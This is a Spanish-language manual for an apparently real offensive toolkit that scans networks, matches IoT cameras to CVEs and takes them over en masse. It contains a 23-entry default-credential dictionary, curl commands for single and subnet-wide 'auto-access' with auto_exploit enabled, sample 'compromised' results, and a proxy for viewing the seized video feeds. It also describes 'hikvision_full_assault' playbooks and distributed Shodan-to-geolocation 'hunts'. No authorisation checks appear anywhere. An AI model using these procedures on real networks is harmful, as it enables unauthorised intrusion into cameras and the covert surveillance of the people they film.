# 📡 COMMANDER + COM-LINK + RED-TEAM-TAURI v6.0 — Manual Unificado

> **Sistema Integral de Auditoría de Red, Inteligencia IoT/Cámaras, Operaciones Distribuidas y Comunicaciones Mesh de Emergencia**  
> **Última actualización:** 2026-08-30 | **Versión:** 6.0
> **Compatibilidad:** Termux (Android F-Droid), Linux (Debian/Ubuntu/Arch), macOS | 100% Offline-Capable

---

## 📋 TABLA DE CONTENIDOS

1. [Visión General y Arquitectura](#visión-general-y-arquitectura)
2. [Instalación y Requisitos](#instalación-y-requisitos)
3. [Dashboard Unificado & Red-team-tauri v6.0 Integration](#dashboard-unificado--red-team-tauri-v60-integration)
4. [Flujo de Operaciones LEVIATHAN v3.0](#flujo-de-operaciones-leviathan-v30)
5. [Guía de Commander (Auditoría de Red y OSINT)](#guía-de-commander)
6. [Módulo IoT y Sistema de Cámaras IP (v6.0)](#módulo-iot-y-sistema-de-cámaras-ip-v60)
   - [Vendor Detection y CVE DB](#vendor-detection-y-cve-db)
   - [Diccionario de 23 Credenciales por Defecto](#diccionario-de-23-credenciales-por-defecto)
   - [Proxy MJPEG (Streaming de Video)](#proxy-mjpeg-streaming-de-video)
   - [Endpoints `/api/iot/*` y Ejemplos curl](#endpoints-apiiot-y-ejemplos-curl)
7. [Guía de COM-LINK v4.0 (Comunicaciones Mesh & Emergencia)](#guía-de-com-link-v40)
8. [Guía de SourceSeal OSIRIS (Sistema de Conectores)](#guía-de-sourceseal-osiris)
9. [SourceSeal TACTICAL v5.0 (Operaciones Distribuidas)](#sourceseal-tactical-v50)
10. [Guía de Comandos de Uso Reales con `curl`](#guía-de-comandos-de-uso-reales-con-curl)
11. [Solución de Problemas y Diagnóstico](#solución-de-problemas-y-diagnóstico)

---

## Visión General y Arquitectura

En el despliegue conjunto con Red-team-tauri, Commander se carga dentro del
backend unificado y queda disponible en `/api/commander/*`. La ejecución CLI
independiente sigue disponible para auditorías puntuales. No se requiere un
servidor Commander separado ni el puerto `8003` para el flujo normal.

El ecosistema **COMMANDER v6.0** unifica el escaneo de red, inteligencia OSINT, análisis e invasión controlada de dispositivos IoT/Cámaras IP, orquestación de operaciones distribuidas Master-Worker, conectores de eventos en tiempo real y transmisión de alertas mediante redes Mesh de comunicación resiliente.

| Componente | Función Principal | Stack Tecnológico |
|------------|-------------------|-------------------|
| **Commander v6.0** | Escaneo de red, fingerprinting, OSINT (IP/Dominio/Email), análisis forense | Python 3, Nmap, SQLite3, Cryptography |
| **Red-team-tauri v6.0** | Dashboard gráfico/TUI, orquestación visual, visor de streamings y telemetría | Tauri (Rust/React/TS) + FastAPI (Port 8001) |
| **Módulo IoT & Cameras** | Detección de Vendor, mapeo CVE DB, auto-access (23 creds), proxy MJPEG | Python 3 Async, Requests, OpenCV/MJPEG, FastAPI |
| **COM-LINK v3.0** | Canales condicionados por APIs, credenciales y hardware; estado verificable | Bash, Termux-API, OpenSSL, SQLite |
| **SourceSeal OSIRIS** | Motor de conectores e integración de datos multi-fuente | Node.js / Python, WebSockets, Cache DB (`~/connector_cache.db`) |
| **SourceSeal TACTICAL** | Coordinación Master-Worker distribuida y ejecución de Playbooks | FastAPI, WebSocket, SQLite (`~/seal_tactical.db`) |
| **SourceSeal Anchor** | Sellado e inmutabilidad de reportes criptográficos | Schnorr 2048-bit, SHA-256 Fernet |

### Esquema de Arquitectura Integrada

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        RED-TEAM-TAURI v6.0 DASHBOARD UNIFICADO                         │
│                                  (HTTP / WS Port 8001)                                 │
├──────────────────┬──────────────────────┬──────────────────────┬───────────────────────┤
│    COMMANDER     │      MÓDULO IoT      │       TACTICAL       │     COM-LINK MESH     │
│                  │                      │                      │                       │
│ • Escaneo Nmap   │ • Detección Vendor   │ • Master / Workers   │ • P2P WiFi / BT       │
│ • OSINT IP/Dom   │ • Consultas CVE DB   │ • Engine Playbooks   │ • SMS / Telegram      │
│ • OSINT Email    │ • Auto-Access (23)   │ • WebSocket Alerts   │ • VoIP / Radio AX.25  │
│ • Forense YARA   │ • Auto-Access Batch  │ • Distributed Scan   │ • Satélite Iridium    │
│ • Fernet .enc    │ • MJPEG Video Proxy  │ • Tasks Queue        │ • Fallback Automático │
└─────────┬────────┴──────────┬───────────┴──────────┬───────────┴───────────┬───────────┘
          │                   │                      │                       │
          └───────────────────┼──────────────────────┼───────────────────────┘
                              ▼                      ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                            SOURCESEAL OSIRIS (CONNECTORS)                              │
│                Cache local: ~/connector_cache.db | API: localhost:3000                 │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## Instalación y Requisitos

### Preparación del Entorno (Termux / Linux / macOS)

#### Dependencias del Sistema
```bash
# En Linux / Termux
pkg update -y && pkg upgrade -y 2>/dev/null || sudo apt-get update -y

# Herramientas base y red
pkg install -y python nmap whois curl wget git sqlite3 jq openssl 2>/dev/null || sudo apt-get install -y python3 python3-pip nmap whois curl wget git sqlite3 jq openssl

# Dependencias para Android / Termux API
pkg install -y termux-api 2>/dev/null || true

# Librerías de Python requeridas
pip3 install pycryptodome requests cryptography fastapi uvicorn websockets yara-python
```

> **⚠️ NOTA EN TERMUX:** Debe utilizarse la versión de Termux provista por **F-Droid**. La versión de Google Play no soporta `termux-api` (SMS, GPS, telefonía).

### Instalación del Repositorio

```bash
git clone https://github.com/sourceseal-star/commander.git
cd commander

# Inicializar COM-LINK v4.0
cd comlink
chmod -R +x *.sh core/ channels/ mesh/ utils/ scripts/
./install.sh
cd ..

# Verificar inicialización de configuración unificada
python3 integration_config.py
```

---

## Dashboard Unificado & Red-team-tauri v6.0 Integration

Red-team-tauri v6.0 opera como la interfaz de mando central en tiempo real. Se comunica con el backend central en el puerto unificado **8001** mediante APIs REST y canales WebSocket.

### Inicio del Backend Integrado

```bash
# Iniciar servidor backend unificado (FastAPI + WebSocket + TACTICAL + IoT)
python3 sourceseal_tactical.py --mode master --host 0.0.0.0 --port 8001
```

### Integración con el Dashboard Frontend

El dashboard web/desktop se conecta automáticamente a:
- **API Base:** `http://localhost:8001/api`
- **WebSocket Alertas:** `ws://localhost:8001/ws/alerts`
- **Proxy Video MJPEG:** `http://localhost:8001/api/iot/mjpeg_proxy`
- **OSIRIS Connector API:** `http://localhost:3000/api`

---

## Flujo de Operaciones LEVIATHAN v3.0

LEVIATHAN v3.0 estructura el flujo de trabajo táctico en 4 fases secuenciales automatizadas:

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  DETECCIÓN   │ ──> │   ANÁLISIS   │ ──> │ EXPLOTACIÓN  │ ──> │   REPORTES   │
│  (Phase 1)   │     │  (Phase 2)   │     │  (Phase 3)   │     │  (Phase 4)   │
└──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
```

1. **Fase 1: Detección (Reconocimiento y Descubrimiento)**
   - Escaneo de subredes con `scan_network`
   - Detección de servicios, puertos abiertos y fingerprinting de cámaras/IoT (`scan_cameras`)
   - Identificación pasiva y activa de fabricantes (Vendor Detection)

2. **Fase 2: Análisis (Evaluación de Amenazas y OSINT)**
   - Búsqueda de vulnerabilidades asociadas en la **CVE DB** integrada (`/api/iot/vulns`)
   - Recopilación OSINT profunda: IP Geo/ASN (`osint_ip`), Registro de dominio y DNS (`osint_domain`), verificación MX/SPF/DMARC (`osint_email`)

3. **Fase 3: Explotación (Prueba de Acceso e Invasión Controlada)**
   - Ejecución del motor de **Auto-Access** utilizando las **23 credenciales por defecto**
   - Disparo de ataques masivos batch en subredes (`/api/iot/auto-access-batch`)
   - Ejecución de playbooks TACTICAL (ej. `hikvision_full_assault`)

4. **Fase 4: Reportes (Inmutabilidad y Notificación)**
   - Cifrado simétrico de hallazgos mediante Fernet (archivos `.enc`)
   - Sellado criptográfico de hashes en **SourceSeal Anchor** (Schnorr 2048-bit)
   - Disparo de alertas críticas inmediatas a través de **COM-LINK Mesh**
   - Transmisión de feeds de vídeo mediante el **Proxy MJPEG**

---

## Guía de Commander

Commander gestiona la auditoría de red de baja escala y la recolección de inteligencia OSINT local.

### Uso interactivo y CLI

```bash
# Menú interactivo TUI
python3 commander.py

# Auditoría automática de subred
python3 commander.py --auto 192.168.1.0/24

# Auditoría automática con envío de informe por Email SMTP
python3 commander.py --auto 10.0.0.0/24 --email auditoria@redteam.local

# Listar auditorías almacenadas en SQLite (~/commander.db)
python3 commander.py --list

# Reanudar auditoría pausada (ID 3)
python3 commander.py --resume 3
```

---

## Módulo IoT y Sistema de Cámaras IP (v6.0)

El módulo IoT v6.0 de Red-team-tauri permite identificar, auditar y visualizar dispositivos de video-vigilancia y hardware de red de forma masiva.

### Vendor Detection y CVE DB

El sistema analiza banners HTTP/RTSP, estructuras HTML, cabeceras `Server`, respuestas ONVIF y puertos característicos para identificar el fabricante:

- **Vendors Soportados:** Hikvision, Dahua, Axis, Foscam, Reolink, Uniview (UNV), Vivotek, Mobotix, Hanwha/Samsung, TP-Link Tapo.
- **Base de Datos CVE DB:** Asocia automáticamente el vendor y puerto identificado con CVEs críticos conocidos:
  - `CVE-2021-36260`: Unauthenticated Command Injection en Hikvision NVR/IPC.
  - `CVE-2020-8516`: Authentication Bypass en cámaras Dahua.
  - `CVE-2018-6414`: Foscam IP Camera Buffer Overflow.
  - `CVE-2021-33544`: Reolink RLC-410 Denial of Service / Auth Bypass.

### Diccionario de 23 Credenciales por Defecto

El motor de auto-acceso prueba secuencialmente la lista de 23 pares estándar de credenciales de fábrica:

| # | Usuario | Contraseña | Fabricantes / Equipos Comunes |
|---|---------|------------|-------------------------------|
| 1 | `admin` | `admin` | Estándar Genérico / Dahua / Foscam / TP-Link |
| 2 | `admin` | `12345` | Hikvision (legacy) / TVT / Raycom |
| 3 | `admin` | `123456` | Dahua / Uniview / Xiongmai (XM) |
| 4 | `admin` | *(vacío)* | Hikvision / Axis / Acti |
| 5 | `admin` | `pass` | Genérico IP Camera |
| 6 | `admin` | `password` | Reolink / Vivotek / Axis |
| 7 | `admin` | `888888` | Dahua DVRs / NVRs |
| 8 | `admin` | `999999` | Dahua Service Accounts |
| 9 | `root` | `root` | Linux Embedded Cameras / Axis |
| 10 | `root` | `pass` | Foscam / Embedded Linux |
| 11 | `root` | `vizqw` | IP Security Camera OEM |
| 12 | `root` | `123456` | Xiongmai / XM DVR |
| 13 | `root` | `juantech` | Juanet DVRs |
| 14 | `service` | `service` | Hikvision / Dahua Backdoor/Service |
| 15 | `supervisor` | `supervisor` | Hanwha Techwin / Samsung |
| 16 | `guest` | `guest` | Acceso Lectura Genérico |
| 17 | `user` | `user` | Vivotek / Panasonic IP Cam |
| 18 | `admin` | `meinsm` | Mobotix |
| 19 | `ubnt` | `ubnt` | Ubiquiti UniFi Video |
| 20 | `admin` | `flir` | FLIR Thermal Cameras |
| 21 | `support` | `support` | Dahua / Hikvision Support |
| 22 | `admin1` | `password` | OEM Cameras |
| 23 | `operator` | `operator` | ONVIF Profile S Standard |

### Proxy MJPEG (Streaming de Video)

Dado que las navegadores modernos bloquean peticiones HTTP con autenticación básica cruzada (CORS / Mixed Content), Red-team-tauri v6.0 incluye un **Proxy MJPEG** en el backend Python (puerto 8001).

El proxy recibe el stream del dispositivo IoT, realiza la autenticación contra la cámara y retransmite los frames MJPEG limpios en la interfaz web en tiempo real.

```
┌──────────────┐   RTSP/HTTP (Auth)   ┌───────────────────┐   Clean MJPEG Stream   ┌──────────────┐
│  Cámara IP   │ <──────────────────> │  Backend (8001)   │ <────────────────────> │ Tauri UI /   │
│ (192.168.x)  │                      │   MJPEG Proxy     │                        │ Dashboard    │
└──────────────┘                      └───────────────────┘                        └──────────────┘
```

### Endpoints `/api/iot/*` y Ejemplos curl

#### 1. Consulta de Vulnerabilidades CVE (`GET /api/iot/vulns`)

```bash
# Consultar vulnerabilidades asociadas a un Vendor
curl -s -X GET "http://localhost:8001/api/iot/vulns?vendor=hikvision" | jq .

# Consultar vulnerabilidades asociadas a una IP específica escaneada
curl -s -X GET "http://localhost:8001/api/iot/vulns?ip=192.168.1.105" | jq .
```

**Respuesta de ejemplo (JSON):**
```json
{
  "status": "success",
  "vendor": "hikvision",
  "vulnerabilities": [
    {
      "cve": "CVE-2021-36260",
      "severity": "CRITICAL",
      "cvss": 9.8,
      "description": "Unauthenticated Command Injection in Hikvision IP Camera/NVR web server",
      "exploit_available": true
    }
  ]
}
```

#### 2. Auto-Access a Dispositivo IoT (`POST /api/iot/auto-access`)

Prueba el diccionario de 23 credenciales y patrones de autenticación sobre un objetivo individual.

```bash
curl -s -X POST "http://localhost:8001/api/iot/auto-access" \
  -H "Content-Type: application/json" \
  -d '{
    "ip": "192.168.1.105",
    "port": 80,
    "vendor": "hikvision",
    "timeout": 5
  }' | jq .
```

**Respuesta de ejemplo (JSON):**
```json
{
  "status": "compromised",
  "ip": "192.168.1.105",
  "port": 80,
  "vendor": "hikvision",
  "valid_credentials": {
    "user": "admin",
    "pass": "12345"
  },
  "stream_url": "http://localhost:8001/api/iot/mjpeg_proxy?ip=192.168.1.105&port=80&user=admin&pass=12345",
  "cve_matched": ["CVE-2021-36260"]
}
```

#### 3. Auto-Access Batch / Escaneo Masivo (`POST /api/iot/auto-access-batch`)

Ejecuta escaneo concurrente multi-hilo en un rango de subred completo para detectar y autenticar todas las cámaras activas.

```bash
curl -s -X POST "http://localhost:8001/api/iot/auto-access-batch" \
  -H "Content-Type: application/json" \
  -d '{
    "subnet": "192.168.1.0/24",
    "ports": [80, 554, 8000, 37777],
    "threads": 20,
    "auto_exploit": true
  }' | jq .
```

**Respuesta de ejemplo (JSON):**
```json
{
  "status": "completed",
  "scanned_hosts": 254,
  "detected_cameras": 3,
  "compromised_cameras": 2,
  "results": [
    {
      "ip": "192.168.1.105",
      "vendor": "hikvision",
      "credentials": "admin:12345",
      "status": "compromised"
    },
    {
      "ip": "192.168.1.120",
      "vendor": "dahua",
      "credentials": "admin:admin",
      "status": "compromised"
    }
  ]
}
```

#### 4. Transmisión Proxy MJPEG (`GET /api/iot/mjpeg_proxy`)

Endpoint para retransmisión directa de vídeo hacia el Dashboard.

```bash
# Obtener cabeceras e inicio del flujo MJPEG
curl -i "http://localhost:8001/api/iot/mjpeg_proxy?ip=192.168.1.105&port=80&user=admin&pass=12345"
```

---

## Guía de COM-LINK v3.0

COM-LINK es un conjunto de adaptadores condicionados por el entorno. El
dashboard no debe anunciar siete canales operativos por la sola presencia del
script. La comprobación no interactiva es:

```bash
bash comlink/comlink.sh status-json | jq
```

Consulta [`../COMLINK_OPERATIVO.md`](../COMLINK_OPERATIVO.md) para la matriz de
requisitos, pruebas seguras y limitaciones. Los comandos de envío son reales y
se ejecutan solo bajo una acción explícita del operador:

```bash
comlink send sms "Mensaje de prueba" +573001234567
comlink send telegram "Mensaje de prueba" "-1000000000000"
comlink location emergencia
comlink queue
comlink status
```

No existe un broadcast `comlink emergency` implementado. Radio AX.25,
satélite y WebRTC devuelven un error explícito hasta integrar drivers y
protocolos verificados. La ubicación usa GPS real cuando Termux:API está
disponible; la ciudad mostrada es una aproximación de la base local, no una
geocodificación en Internet.

---

## Guía de SourceSeal OSIRIS

SourceSeal OSIRIS es el subsistema encargado de los conectores de eventos y la sincronización entre Commander, TACTICAL y el Dashboard Red-team-tauri.

### Características Clave de OSIRIS
- **API URL Base:** `http://localhost:3000/api`
- **WebSocket Feed:** `ws://localhost:8001/ws/alerts`
- **Cache Local:** Base de datos SQLite dedicada en `~/connector_cache.db`.
- **Motor de Reintentos:** Hasta 5 reintentos automáticos con retardo exponencial (1.0s) en caso de caída de enlace.

```bash
# Verificar estado de conectores OSIRIS vía Python
python3 -c "from integration_config import get_config; print(get_config('osiris'))"
```

---

## SourceSeal TACTICAL v5.0

TACTICAL es la plataforma de operaciones distribuidas Master-Worker para la ejecución paralela de escaneos y ataques en redes corporativas extensas.

### Modo Master

```bash
# Iniciar Master en puerto unificado 8001
python3 sourceseal_tactical.py --mode master
```

### Modo Worker

```bash
# Iniciar Worker en nodo remoto apuntando al Master
python3 sourceseal_tactical.py --mode worker --master-url http://192.168.1.100:8001
```

### Endpoints REST de TACTICAL

| Endpoint | Método | Descripción |
|----------|--------|-------------|
| `/api/status` | `GET` | Estado general del sistema y módulos activos |
| `/api/scan?target=X` | `POST` | Iniciar escaneo en objetivo `X` |
| `/api/playbook/execute` | `POST` | Ejecutar un playbook en un objetivo |
| `/api/playbook/list` | `GET` | Listar playbooks disponibles (`hikvision_full_assault`, `osint_deep_dive`) |
| `/api/playbook/history` | `GET` | Historial de ejecuciones de playbooks |
| `/api/alerts` | `GET` | Obtener registro de alertas de seguridad |
| `/api/workers` | `GET` | Listar workers conectados y su estado |
| `/api/distributed/dispatch` | `POST` | Despachar tareas masivas a la granja de workers |

---

## Guía de Comandos de Uso Reales con `curl`

A continuación se detalla la suite completa de comandos `curl` para interactuar con la API del ecosistema COMMANDER v6.0 en el puerto **8001**.

### 1. Sistema y Estado General

```bash
# Obtener estado de salud del sistema backend
curl -s -X GET "http://localhost:8001/api/status" | jq .
```

### 2. Módulo IoT y Cámaras IP

```bash
# Búsqueda de vulnerabilidades por fabricante
curl -s -X GET "http://localhost:8001/api/iot/vulns?vendor=dahua" | jq .

# Búsqueda de vulnerabilidades por dirección IP
curl -s -X GET "http://localhost:8001/api/iot/vulns?ip=10.0.0.50" | jq .

# Intento de auto-acceso individual (23 credenciales)
curl -s -X POST "http://localhost:8001/api/iot/auto-access" \
  -H "Content-Type: application/json" \
  -d '{"ip": "10.0.0.50", "port": 80, "vendor": "dahua"}' | jq .

# Escaneo batch de rango completo
curl -s -X POST "http://localhost:8001/api/iot/auto-access-batch" \
  -H "Content-Type: application/json" \
  -d '{"subnet": "10.0.0.0/24", "ports": [80, 554, 37777], "threads": 15}' | jq .

# Testeo de Proxy Stream MJPEG
curl -i "http://localhost:8001/api/iot/mjpeg_proxy?ip=10.0.0.50&port=80&user=admin&pass=admin"
```

### 3. Operaciones Distribuidas TACTICAL

```bash
# Disparar escaneo de red distribuido
curl -s -X POST "http://localhost:8001/api/scan?target=192.168.1.0/24" | jq .

# Listar Playbooks disponibles
curl -s -X GET "http://localhost:8001/api/playbook/list" | jq .

# Ejecutar Playbook 'hikvision_full_assault'
curl -s -X POST "http://localhost:8001/api/playbook/execute" \
  -H "Content-Type: application/json" \
  -d '{
    "playbook": "hikvision_full_assault",
    "target": "192.168.1.105"
  }' | jq .

# Consultar Workers conectados
curl -s -X GET "http://localhost:8001/api/workers" | jq .

# Consultar historial de Alertas
curl -s -X GET "http://localhost:8001/api/alerts" | jq .
```

---


## GHOST HUNTER PHANTOM (`:8002`)

Orquestador distribuido de cazas. Se ejecuta junto al dashboard de Red-team-tauri (:8001).

### Arquitectura

```
:8001 Dashboard (dashboard_server.py)
    ↑                    ↑
    | reporta alertas    | llama endpoints
    |                    |
:8002 PHANTOM Master  ←→ PHANTOM Node (worker)
    encola cazas        ejecuta playbook
```

### Endpoints del Master (:8002)

| Método | Ruta | Descripción |
|--------|------|-------------|
| POST | `/api/hunt/start` | Iniciar caza (query, playbook, target_type) |
| GET | `/api/tasks/{id}` | Estado de una tarea |
| GET | `/api/tasks` | Listar todas las tareas |
| GET | `/api/status` | Nodos activos, tareas, cola |
| WS | `/ws/nodes` | Conexión de nodos workers |

### Endpoint en Dashboard (:8001)

| Método | Ruta | Descripción |
|--------|------|-------------|
| POST | `/api/phantom/alert` | Recibe alertas críticas del master (broadcast WS) |

### Playbooks disponibles
- `hikvision` — Caza cámaras Hikvision: Shodan → camera scan (auto-access) → geo → reporte
- `dahua` — Caza cámaras Dahua
- `generic` — Caza genérica de dispositivos
- `router` — Caza routers

### Flujo de una caza
1. `POST :8002/api/hunt/start` con query + playbook
2. Master encola la tarea y la asigna a un node disponible
3. Node ejecuta el playbook llamando al dashboard (:8001):
   - `/api/osint/full/{query}` — búsqueda OSINT
   - `/api/iot/auto-access?ip=X&port=Y` — vendor + CVEs + creds + snapshot
   - `/api/osint/full/{ip}` — geo + threat scoring
4. Node devuelve resultados al master
5. Master reporta hallazgos críticos: `POST :8001/api/phantom/alert`
6. Dashboard hace broadcast por WebSocket a todos los clientes

### Iniciar caza
```bash
curl -X POST http://localhost:8002/api/hunt/start \
  -H "Content-Type: application/json" \
  -d '{"query": "192.168.1.0/24", "playbook": "hikvision", "max_results": 50}'
```

### Ver estado
```bash
curl http://localhost:8002/api/status | python3 -m json.tool
```

## Solución de Problemas y Diagnóstico

### Módulo IoT y Cámaras

| Problema | Causa Probable | Solución |
|----------|----------------|----------|
| `Connection refused` en `/api/iot/*` | Servidor FastAPI no iniciado en el puerto 8001 | Ejecutar `python3 sourceseal_tactical.py --mode master` |
| Streaming MJPEG no carga | Credenciales incorrectas o puerto RTSP/HTTP bloqueado | Verificar resultado de `/api/iot/auto-access` y comprobar reglas de firewall |
| Timeouts en `auto-access-batch` | Demasiados hilos concurrentes para la interfaz de red | Reducir la cantidad de `"threads"` en el body del POST (ej. de 20 a 5) |

### COM-LINK Mesh

| Problema | Causa Probable | Solución |
|----------|----------------|----------|
| `termux-sms-send: command not found` | Instalación desde Google Play o falta del paquete `termux-api` | Reinstalar Termux desde F-Droid e indicar `pkg install termux-api` |
| Fallo al enviar mensaje Telegram | Bot Token o Chat ID desconfigurados | Ejecutar `comlink config` y reintroducir las credenciales de @BotFather |
| Dispositivos Mesh no visibles | Bluetooth / WiFi desactivado o interfaz sin permisos | Habilitar Bluetooth y ejecutar `comlink status` |

### TACTICAL & OSIRIS

| Problema | Causa Probable | Solución |
|----------|----------------|----------|
| Worker no se conecta al Master | URL del Master errónea o puerto 8001 cerrado | Verificar conectividad con `curl -i http://<MASTER_IP>:8001/api/status` |
| Error en base de datos SQLite | Permisos insuficientes en directorio `~` | Ejecutar `chmod 755 ~` y verificar espacio libre en disco |

---

**⚡ COMMANDER + COM-LINK + RED-TEAM-TAURI v6.0 — Infraestructura unificada de seguridad ofensiva y comunicaciones resilientes.**
